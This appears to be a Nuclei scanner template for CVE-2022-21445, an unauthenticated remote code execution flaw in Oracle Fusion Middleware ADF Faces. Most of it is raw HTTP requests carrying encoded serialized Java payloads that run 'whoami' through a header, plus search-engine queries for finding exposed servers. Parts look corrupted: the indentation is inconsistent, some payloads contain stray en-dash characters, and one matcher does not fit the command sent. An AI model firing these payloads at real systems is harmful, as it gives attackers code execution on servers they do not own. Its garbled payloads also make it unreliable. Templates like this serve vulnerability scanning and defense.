id: CVE-2022-21445

info:
  name: Oracle Fusion Middleware ADF Faces - Remote Code Execution
  author: greenhacker
  severity: critical
  description: |
    Oracle Fusion Middleware ADF Faces component (versions 12.2.1.3.0 and 12.2.1.4.0) contains a critical Java deserialization vulnerability in the RemoteApplicationResourceLoader class. The vulnerability allows unauthenticated attackers to execute arbitrary code remotely by sending a malicious serialized payload to the ResourceServlet endpoint. The flaw exists in the fromString() method which deserializes user input without proper validation. This vulnerability is also known as the "Miracle Exploit" and has been actively exploited in the wild.
  remediation: |
    Apply Oracle Critical Patch Update from April 2022. Upgrade to the latest patched version of Oracle Fusion Middleware. Implement network-level restrictions to limit access to ADF Faces endpoints (/*/afr/*/remote/*).
  reference:
    - https://www.oracle.com/security-alerts/cpuapr2022.html
    - https://github.com/hienkiet/CVE-2022-21445-for-12.2.1.3.0-Weblogic
    - https://peterjson.medium.com/miracle-one-vulnerability-to-rule-them-all-c3aed9edeea2
    - https://nvd.nist.gov/vuln/detail/CVE-2022-21445
    - https://blog.ostorlab.co/oracle_application_development_framework.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-21445
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 2
    vendor: oracle
    product: fusion_middleware
    shodan-query: http.title:"Oracle"
    fofa-query: app="Oracle-Fusion-Middleware"
  tags: cve,cve2022,oracle,adf,rce,deserialization,kev,critical

variables:
  cmd: "whoami"

http:
  - raw:
      - |
        GET /em/afr/foo/remote/H4sIAAAAAAAAAA%3D%3DtVdbcBtXGf5WlrSb9ToX5eIotzalDXJi6%2BJbsB1KJdkiAeVCZNwkBsxqdWxv-stqVd49sB2jacm8LpdxpaBugtOESmOFFZDqTTuCBYWCAGV6Y4QF4YIYO0z7BDDwwlP_oEkux3DgP-SKOze_7_P__l_N_5_6NrbyDguRgwnGKU6_ac4zlW1LQ5c23dipa5KWaLzgUWPc2KDmdpx_a4Wza4-4_7m8uuZ6T_9fckH3zSU4ozuJN05j2PrdPa8vqjHLFIXO5k_zww%2BloVWnCmwWdM2uenYHANZshhr-WIw1LMaExVjNYixt6Z43fmvR2HKp7Da0R4X2aF37M789c2Wz12P5gOUS6EMRJe4c0W36H_j1q0_9-C3%2B8XI1nA8WTrwpwmqay8BdnzAJHYr1%2BHyswm5v8Ys1rUnHtH93_DiqTf6k72Vn51X9feZV8HcSP-ZZxQcRAnVZzC%2B2ScVuFHToWESQXvV6FhSsXDOCOGswrOyZgWxA%2Bo%2BCA%2BJGNGwYdl6AqOqNiEvIrd-MBQUVDDMismcgnnxNFWcxwUZloKieLUVOApKKrZgQYULTwVHWbwtimFJDMuCe1HGR1S8HR%2BV8TEZ-j0gIHhFb9qCEjkjPlAR_2ikwCZuyps1OlIt55k7qeYsooaxj6NaU7ppiXif62TIzJGxtAskp1zGY-541JkPWCXqItlbA7u8TyljNnGrElx70Qe5iGZI1JcoFZk1kFCeEmLS6btQgNsYxgkUyHkz8vfFgF-RmK5bEFCdMWEx9xFi_GVfOZqhNNsocw8fqxYsmrLPAmx9SzzSnRQWGOdUSy0epLjrmnPEcu_qLsJ-CdubeBPLBitVAU9sPm%2BSyXPrQJ2lF_MFPZatPhrou38i0T%2BRTg6OZOLD4_HBeCI5Mj4YH071j6fT-hweHB5JkoyvHdePCcb1UTVA1x5dkPEqgJGwRsAgxMh4jDEhQc07ZNVjGFIkcvEtTURGihM2350PD-ITwu4%2BMaPoFPUuJb8z5BaClzNjnvMr2g4VP4tIbP4LMSthiObdNy2qijul2wmKvhCTxJnmt4Cp_T-8Hk8TVJzjLfmkoC64kH1qGr4Ap6R8UUNX8KXJfTeDSoorc0WammX0HdXENHwFXxVw9fwdToBjhe1-9SLl4RsanhXky_gmQWjJtDU8h%2BdlvKDhCr7VspE1OEnwxQwNcXyb3rx5Gvpo%2Bh28KOO7Gl5CL6VR-w8u4quF7%2BL6GH6BXww_FcA29dCLbQFDDjwTrzP8LflK189xBdTJPLUc3eLUD1YpIeM3iIKF7jZJA-YFhVciTsiLRpV6KqNW1vDXx0Uoyy61Jkjfm2SE_2dik6UBsJEemapHBMwl6Se6tqpogFAomUhBaV-VSIJbCaBcWZYussK9Vj6IqvLSc9bVMMuj_GkIWI2a2U4ck5E2UGaJRyItNmDdoVzA4kfZ3zeIQ8e-auPB9Crn2_lU00Dqdq7Fox5TS76EkTa%2BtUvZWu4epaQIWBy4w4bdKsmy6U0US_xitb2daz1nFz3O-ihI6SS8hqMRcIdbJnayzxNy0Lo5%2BKyhuaVWoXHHdtCnHu5s9Sc_rbk7UE9tgY8JcE0hPl%2BkUFUmn-SvZuTba3GKiTyUKkBcltIlxpsztWatbJMi%2BVOUkznQIbakbqWqWreUm9wyXuehFtm2Ex3U2VZ2dF-esShOWY3udLdCNN0Yk0MMta55JqcNeR2RtqKCXAHZq2yqIMBw3JEajqr84bFTSXaIV5tfpNUXhj2-o4duYeIj0fcQemnsA3w%2BBKAQ9Y2DHTcg_RS%2B6%2Bi4CX8FgeyhCoIhuQLleC_NN_TSXD3RJ4idJKtV-0NUn1lSw8SY2jfqrnM2rOFtGA2F_KFTB1tFgOPgLXAoHK9h2GYuh7dexo4Lu0M4Kws9i_3XsCt7A-7rMdoVDurD%2B0J3c2EA7mKtg7Kl_FvhXuPsG9p4kbDlRwbwX7q88wOXxfBW%2BrE%2B%2BvPx8QzwNXoYio-Ij%2Bh4BX8FX%2Bji18HohT%2BFLbTGCSqghA2YA9U2rJO4mtIogvT2IgC3UAX6Mr4OElcwTa8gh34Obrx-O%2BzEHxDGn7GLdO4jrXvwGvbiddyDGGmdJV3PkZ04EpBp1cH6Wwi_Rz8GyJc9%2BCVdlYfgI3s3MIzD-JJ3Ei3gHRui2PE2tfxRjlKgCHsMRvJP8fI3oD%2BJdtJZSh4dIGkjRbwCBN8k5WUZaxriMCRkZGe%2BW-cVTGMeA_2CXjPW8SFiSSoCUy3usnJVla6sNx%2BmsRW%2Bdfi0YXfCTzM37zn5ERHzqy6CzOeCkqFCeo-x_N2d8IsVBI5RajU59gCLqGrRplirkcduUpZLnFsbG21HJH1NmmOewf7B1Lx_nR8KB5PHE71D46n-EvHxTObw0EgyOTScyvwPvlNuShcOAAA%3D-/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        cmd: {{cmd}}
        Accept: */*
        Connection: close

      - |
        GET /bicomposer/afr/foo/remote/H4sIAAAAAAAAAA%3D%3DtVdbcBtXGf5WlrSb9ToX5eIotzalDXJi6%2BJbsB1KJdkiAeVCZNwkBsxqdWxv-stqVd49sB2jacm8LpdxpaBugtOESmOFFZDqTTuCBYWCAGV6Y4QF4YIYO0z7BDDwwlP_oEkux3DgP-SKOze_7_P__l_N_5_6NrbyDguRgwnGKU6_ac4zlW1LQ5c23dipa5KWaLzgUWPc2KDmdpx_a4Wza4-4_7m8uuZ6T_9fckH3zSU4ozuJN05j2PrdPa8vqjHLFIXO5k_zww%2BloVWnCmwWdM2uenYHANZshhr-WIw1LMaExVjNYixt6Z43fmvR2HKp7Da0R4X2aF37M789c2Wz12P5gOUS6EMRJe4c0W36H_j1q0_9-C3%2B8XI1nA8WTrwpwmqay8BdnzAJHYr1%2BHyswm5v8Ys1rUnHtH93_DiqTf6k72Vn51X9feZV8HcSP-ZZxQcRAnVZzC%2B2ScVuFHToWESQXvV6FhSsXDOCOGswrOyZgWxA%2Bo%2BCA%2BJGNGwYdl6AqOqNiEvIrd-MBQUVDDMismcgnnxNFWcxwUZloKieLUVOApKKrZgQYULTwVHWbwtimFJDMuCe1HGR1S8HR%2BV8TEZ-j0gIHhFb9qCEjkjPlAR_2ikwCZuyps1OlIt55k7qeYsooaxj6NaU7ppiXif62TIzJGxtAskp1zGY-541JkPWCXqItlbA7u8TyljNnGrElx70Qe5iGZI1JcoFZk1kFCeEmLS6btQgNsYxgkUyHkz8vfFgF-RmK5bEFCdMWEx9xFi_GVfOZqhNNsocw8fqxYsmrLPAmx9SzzSnRQWGOdUSy0epLjrmnPEcu_qLsJ-CdubeBPLBitVAU9sPm%2BSyXPrQJ2lF_MFPZatPhrou38i0T%2BRTg6OZOLD4_HBeCI5Mj4YH071j6fT-hweHB5JkoyvHdePCcb1UTVA1x5dkPEqgJGwRsAgxMh4jDEhQc07ZNVjGFIkcvEtTURGihM2350PD-ITwu4%2BMaPoFPUuJb8z5BaClzNjnvMr2g4VP4tIbP4LMSthiObdNy2qijul2wmKvhCTxJnmt4Cp_T-8Hk8TVJzjLfmkoC64kH1qGr4Ap6R8UUNX8KXJfTeDSoorc0WammX0HdXENHwFXxVw9fwdToBjhe1-9SLl4RsanhXky_gmQWjJtDU8h%2BdlvKDhCr7VspE1OEnwxQwNcXyb3rx5Gvpo%2Bh28KOO7Gl5CL6VR-w8u4quF7%2BL6GH6BXww_FcA29dCLbQFDDjwTrzP8LflK189xBdTJPLUc3eLUD1YpIeM3iIKF7jZJA-YFhVciTsiLRpV6KqNW1vDXx0Uoyy61Jkjfm2SE_2dik6UBsJEemapHBMwl6Se6tqpogFAomUhBaV-VSIJbCaBcWZYussK9Vj6IqvLSc9bVMMuj_GkIWI2a2U4ck5E2UGaJRyItNmDdoVzA4kfZ3zeIQ8e-auPB9Crn2_lU00Dqdq7Fox5TS76EkTa%2BtUvZWu4epaQIWBy4w4bdKsmy6U0US_xitb2daz1nFz3O-ihI6SS8hqMRcIdbJnayzxNy0Lo5%2BKyhuaVWoXHHdtCnHu5s9Sc_rbk7UE9tgY8JcE0hPl%2BkUFUmn-SvZuTba3GKiTyUKkBcltIlxpsztWatbJMi%2BVOUkznQIbakbqWqWreUm9wyXuehFtm2Ex3U2VZ2dF-esShOWY3udLdCNN0Yk0MMta55JqcNeR2RtqKCXAHZq2yqIMBw3JEajqr84bFTSXaIV5tfpNUXhj2-o4duYeIj0fcQemnsA3w%2BBKAQ9Y2DHTcg_RS%2B6%2Bi4CX8FgeyhCoIhuQLleC_NN_TSXD3RJ4idJKtV-0NUn1lSw8SY2jfqrnM2rOFtGA2F_KFTB1tFgOPgLXAoHK9h2GYuh7dexo4Lu0M4Kws9i_3XsCt7A-7rMdoVDurD%2B0J3c2EA7mKtg7Kl_FvhXuPsG9p4kbDlRwbwX7q88wOXxfBW%2BrE%2B%2BvPx8QzwNXoYio-Ij%2Bh4BX8FX%2Bji18HohT%2BFLbTGCSqghA2YA9U2rJO4mtIogvT2IgC3UAX6Mr4OElcwTa8gh34Obrx-O%2BzEHxDGn7GLdO4jrXvwGvbiddyDGGmdJV3PkZ04EpBp1cH6Wwi_Rz8GyJc9%2BCVdlYfgI3s3MIzD-JJ3Ei3gHRui2PE2tfxRjlKgCHsMRvJP8fI3oD%2BJdtJZSh4dIGkjRbwCBN8k5WUZaxriMCRkZGe%2BW-cVTGMeA_2CXjPW8SFiSSoCUy3usnJVla6sNx%2BmsRW%2Bdfi0YXfCTzM37zn5ERHzqy6CzOeCkqFCeo-x_N2d8IsVBI5RajU59gCLqGrRplirkcduUpZLnFsbG21HJH1NmmOewf7B1Lx_nR8KB5PHE71D46n-EvHxTObw0EgyOTScyvwPvlNuShcOAAA%3D-/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        cmd: {{cmd}}
        Accept: */*
        Connection: close
    - |
        GET /webcenter/afr/foo/%72%65%6d%6f%74%65/%3aH4sIAAAAAAAAAA%3D%3DjVNNbxtFGJ44CaQhtGmQIsSFrRFhrdTjIqVVJSuFxEloJKepYvdDGBQmu5Ps–JrMz65lZe0NVUG9Ic0BAD5yCuIIOQvwAKrhVIHFC4gcg9QDHHhHvzK4_kkoRlrxav_08z_u8X%2BNv–_0bjSqLz%2B6RDcKJDhq8TFWyQePz5Px_9PPvB760osIYmmSD%2BGvG0kOvojA4kVYFgfhq_9Tayn%2B4E–PArme5ysKSKfsqlHT6%2BVX9__axSN1NGkJ6KYSAJkGs3WDbhiwJVa3l5NY%2BC5CECsCd8TSrCMj6Za–Whm4FpCQU3%2B1Z_jk6MH3X7zf%2BhhEpBJd0c11aUfZVxNPqFDTPsnEweJn4%2BG5lQIaaaGpaJv0TzR6–rVUH0kqPNJN8m7Bk4F6FyOX_E7nvQR88vHRNXr0AAaGw0TZvErlHdRqboiYyD3qC70TQ4przzuVf–vvrXZB7nLaicpmKL7jLq6VDwPsk_Hz55%2BFPlx68LqNAy0oi4CZ2INHqplTWIAVdlc2cf_Kp1g1Ab–VAfC12hmCNDQMuR71bSNPkITeQo5AzYAnDN8_tvdo2lVYj3JIyD5spB7WMWGYBdC066QB1jSSGiw–YJXEMXQBtIOBrvOO8IjJYJt9evR08vxkAY2BcCheElGulRHwIowa0aBoJ9FUaXRuaNRgJiGNyCjm–cAOiGYezLXTWDCBYqWwexsZpZjj_GiNkwWwmBj1t8os1eoHT7jpXUGyPQrozw%2BlmDt_M_vHd41_f–_bKXLdLouRAyOKBW55QtVI9yRI_%2B0CHS8bSz6AyYmrBzxMdeIiXkl_1yS1XHQrsA9TSGwall53eg–dr3T3S2qzHnXnhtBbsm8rlCPEUn9tZAy3y3CSseCK1oEN%2BOCFdVLnkeVCncYdbVMaE4oLZ_FAI3r–dcEuM4eGJjpR7sKlhRwrDFRmyAaVHUb1ZqLjBJCQQTSksT0AniaynUBXco3t0zS2M41tqxGIe7V6–08ax5utQQyrd4t3y5tZSrb5aXtloIBu31lcMf7jrAvbCosMTxpy5OSf7VSyW7lkeEUWE%2B4vQ_KEu–ZfPvGkOK04jhnZD7eIVAWWCcaoJ3qITZwjBlii4TRa8sLIecyEOIVcoVslDpWuSDzD633d8lKclh–HQ5N0XIQJj5UpQJRKioonrSXvZOmXHUeKR6OYfXflMJUczkJmalM7grwGDbRDyXs7qqUQubdGyp4–nHkCY4xhF6TutVbYdht7hjCFX%2BfPTIDyCOdUPnN1I7O7Gc3F4q3mWvlqccDtmJZUnW4QwgDkJDgg–6gZcd26pdM9A5hd79JiDuQ7_G27JmXek73FwvV%2BFKcVdCf8DJorRt3wIF4ZrGnLfnO2yRAVuPuVw–fMdgJQxo5gQjUdVojKbU647Zy8zs8sxgozsSzR%2B7jz0RUFhTj%2BKoQxlWAW4ElLGGGWTB0eCTxrFh–ecVyvZxzTZ%2B8To85aDRC7P07ZmUUzONMpsu8vmoecxbwRvofZgQj9P0HAAA%3D/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        X-ORACLE-DMS-SUID: d2hvYW1p
        Accept: */*
        Connection: close
     - |
        GET /application-frontend/afr/foo/%72%65%6d%6f%74%65/%3aH4sIAAAAAAAAAA%3D%3DrVVNbNxEFJ5sEqlJ%2BKn4FVTAYgQ40thR0pZDFFDYbkikbZNmI1qxSKtZ%2B%2B16–um0POzPe7HLogRsSqnrghhBc4IC4IH4kJCQuiBMgcQGJGweOHEGqEIg39tpOUhpaUZ_sN9_7vvfe–PL_30W9kWkny4EU6oE6iGXe2JBOS6dG5BBJ46%2BeFT_984fWPJ0llg0wp9ho0yKwnwphKqoXU5IGG–8XSNp1sr7MvDmBBSQeIFBDuaRj2hBM8ESnenPtSSevhWul775MsL325_93iFTDTIXNiGHKKJ1UBX–NyfLNF%2BmPIGCBnVR8_j1mgWLUwsoi8AvlVtPzsk_Vj6rEDKU5NRhrqsdIb6aYIViutQ9OI95c5rd–fRqDbpE7wjatl1e_0bqJsCV59maUC4%2B3J_1y5acJ8isKbpCZsB3tUNkDnZadJHIseoDvgKi1Vn3p–5Nfv_W0yN34TWDr3sCi2ocvB00xEBcljnd_9L859fl%2BFVFomDiq28BpDTe5tZY3Bkcvd7FxEv%2BWG–QagzoAPha3LPHkBTSxb1loeXyGUyM05hz0AYgDNmuPr9hXePqnlehKwn%2BwMqq6CrK9USXeNUKacr–5Fkagm3tQoeLHvOcXSH72HPgJRp2Agnut%2BaXZw1BiP6gHSzhafA4leBnYodWmmqJlBDp8%2Bid4739–ghmZ42XA7Mv0oRKhocOigeiD7emxubuIZk8ayTRce36v%2BhoDjuKeiKKs4us08jlIo99ddBToVc8D–pViHg61lArlYgKwIQCrbk7nUkpEKDpeScCkBpVOBpRsLIMwoLGUKQWFVaMUzY94GFYtIgSkAHhiu–pqY6UfbiyYWxg8jwyuCbIAcc9Gai4wSRWLvQuArl70IcAtsu69wcKQ2hcdqSIgapR7aFuAiv2Zqv–Pl01Xo2sNLkXRxowz1ugSU8HIBUW%2B_9yJQrkbQkqJQrEbSLymTyEp8sTFeR3hofnDa_EXskELOwM–Te6KpTBtgSMwxI7cncKfcBLnxvP75oYnAsAfwYN01osI_wmHxjFnHjW9jNYIYeDUctw3Z59qXfnw–8lcVMr1B5trtsF33mYFukCPm64zw4RUya16bnmSxbpCHzecWuS_MFil2hOBqHbhJmKzuH7lFPK6v–OLa5HLkswuQiyt1_p8BZdbRUq0c93BmaHEsn0tBVqdXde2hG%2BIlbKkItK8Jzf73_SLP_w4ls_xz_–T4rVkkL9eKpRf2MBp2GlkRWnITyKv1I%2BW9NVk9kwoTvTiuGg9VhMuSYPZSCF49Dse7c4MrlUbxBI–LQ_k6eRq9drUB%2B9Mkum1TLy9KX2QY512LWDcN90Q3L8nmHWqAk07aTwzKW4N4MAyKLZF2ghtXCjI–ct32L%2B%2B0CKngbLKoblbJo9k%2BjPEZxumreSbi2BxWh_8ANFTLnPwIAAA%3D/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        X-ORACLE-DMS-SUID: d2hvYW1p
        Accept: */*
        Connection: close   
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "oracle.adf"
        condition: or

      - type: regex
        part: body
        regex:
          - "root:[x*]:0:0:"
          - "nt authority\\\\system"
          - "root|administrator|www-data"
        condition: or

      - type: status
        status:
          - 200